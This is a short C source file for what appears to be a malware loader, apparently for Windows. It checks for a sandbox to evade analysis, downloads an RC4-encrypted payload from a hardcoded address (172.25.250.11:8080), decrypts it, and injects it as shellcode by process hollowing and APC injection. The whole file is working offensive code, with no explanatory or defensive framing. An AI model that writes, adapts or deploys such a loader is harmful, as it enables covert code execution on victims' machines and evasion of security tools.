#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rc4.h"
#include "sandbox.h"
#include "http.h"
#include "inject.h"

#define PAYLOAD_URL "http://172.25.250.11:8080/api"
#define RC4_KEY     "kernel32.dll"

int main(void)
{
    /* Anti-sandbox : bail if RAM < 1 GB */
    if (!sandbox_check()) {
        printf("[-] Sandbox check failed\n");
        return 0;
    }
    printf("[+] Sandbox check passed\n");

    /* Download encrypted payload */
    uint8_t *payload = NULL;
    size_t   payload_len = 0;

    if (!http_download(PAYLOAD_URL, &payload, &payload_len)) {
        printf("[-] Download failed\n");
        return 1;
    }
    printf("[+] Downloaded %zu bytes\n", payload_len);

    /* Decrypt RC4 in-place */
    rc4_crypt((const uint8_t *)RC4_KEY, strlen(RC4_KEY), payload, payload_len);
    printf("[+] RC4 decrypted\n");

    /* Inject via process hollowing + APC */
    BOOL ok = inject_shellcode(payload, payload_len);
    printf("[%c] Injection %s\n", ok ? '+' : '-', ok ? "OK" : "FAILED");

    free(payload);
    return ok ? 0 : 1;
}
